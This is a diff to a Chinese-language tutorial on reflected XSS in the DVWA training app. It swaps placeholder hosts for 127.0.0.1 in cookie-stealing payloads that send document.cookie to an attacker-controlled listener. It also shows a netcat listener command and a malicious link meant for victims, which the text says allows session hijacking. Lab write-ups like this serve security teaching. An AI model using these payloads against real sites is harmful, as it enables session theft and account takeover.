@@ -115,14 +115,14 @@ new Image().src='http://攻击者服务器/steal?c='+document.cookie;
 </script>
 ```
 
-将受害者 Cookie 发送到攻击者服务器。实际利用时需要搭建一个接收端（如 `nc -lvnp 80` 或简单的 HTTP 服务）。
+将受害者 Cookie 发送到攻击者服务器。实际利用时需要搭建一个接收端（如 `nc -lvnp 8000` 或简单的 HTTP 服务）。
 
 ### 5. URL 编码传递
 
 由于反射型 XSS 需要通过 URL 传递 Payload，某些字符在 URL 中需要编码。例如：
 
 ```text
-http://靶机IP/dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script>
+http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script>
 ```
 
 浏览器会自动对部分字符进行编码，也可以手动编码：
@@ -136,7 +136,7 @@ http://靶机IP/dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script>
 攻击者可以将恶意 URL 发送给受害者：
 
 ```text
-http://靶机IP/dvwa/vulnerabilities/xss_r/?name=<script>new Image().src='http://192.168.1.10/steal?c='+document.cookie;</script>
+http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=<script>new Image().src='http://127.0.0.1:8000/steal?c='+document.cookie;</script>
 ```
 
 受害者点击后，Cookie 会被发送到攻击者服务器。攻击者拿到 `PHPSESSID` 后即可伪造会话，登录受害者的 DVWA 账号。
@@ -148,7 +148,7 @@ http://靶机IP/dvwa/vulnerabilities/xss_r/?name=<script>new Image().src='http:/
 1. 拦截请求：
    ```http
     GET /dvwa/vulnerabilities/xss_r/?name=test&Submit=Submit HTTP/1.1
-    Host: 靶机IP
+    Host: 127.0.0.1
     Cookie: PHPSESSID=...; security=low
    ```
 2. 将 `name` 参数改为：
